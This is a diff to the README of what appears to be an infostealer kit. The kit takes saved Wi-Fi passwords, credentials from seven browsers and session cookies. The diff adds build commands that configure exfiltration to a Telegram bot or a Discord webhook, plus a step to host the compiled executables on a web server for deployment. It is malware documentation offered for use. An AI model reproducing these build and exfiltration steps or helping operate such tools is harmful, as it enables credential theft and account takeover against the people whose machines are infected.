@@ -48,11 +48,33 @@ Extracts saved credentials from **7 browsers** + session cookies:
 - Message `@userinfobot` → get chat ID
 
 ### 2. Compile
-Edit `tools/src/*.c` — replace `YOUR_BOT_TOKEN_HERE` and `YOUR_CHAT_ID_HERE`:
+
+Use the build script with your preferred exfil method:
+
+```bash
+# Telegram exfil
+python tools/build.py all --telegram --token YOUR_BOT_TOKEN --chat YOUR_CHAT_ID
+
+# Discord webhook exfil
+python tools/build.py all --discord --webhook https://discord.com/api/webhooks/ID/TOKEN
+
+# Build only WiFi tool
+python tools/build.py wifi --telegram --token YOUR_TOKEN --chat YOUR_CHAT
+
+# Build only browser tool with Discord
+python tools/build.py browser --discord --webhook https://discord.com/api/webhooks/ID/TOKEN
 ```
-cl /O2 /Fe:wifi_grab.exe wifi_grab.c wlanapi.lib ole32.lib advapi32.lib user32.lib
-cl /O2 /Fe:browser_grab.exe browser_grab.c crypt32.lib bcrypt.lib shell32.lib advapi32.lib user32.lib ole32.lib
+
+Or compile manually with Visual Studio:
+```bash
+# Telegram
+cl /O2 /DUSE_TELEGRAM /DTG_TOKEN="your_token" /DTG_CHAT="your_chat_id" /Fe:wifi_grab.exe wifi_grab.c wlanapi.lib ole32.lib advapi32.lib user32.lib
+
+# Discord
+cl /O2 /DUSE_DISCORD /DDC_WEBHOOK="your_webhook_url" /Fe:wifi_grab.exe wifi_grab.c wlanapi.lib ole32.lib advapi32.lib user32.lib
 ```
+
+**Requirements:** Visual Studio 2022 with C++ desktop development workload, Windows 10/11 SDK.
 
 ### 3. Host & Deploy
 - Upload compiled `.exe` to your web server
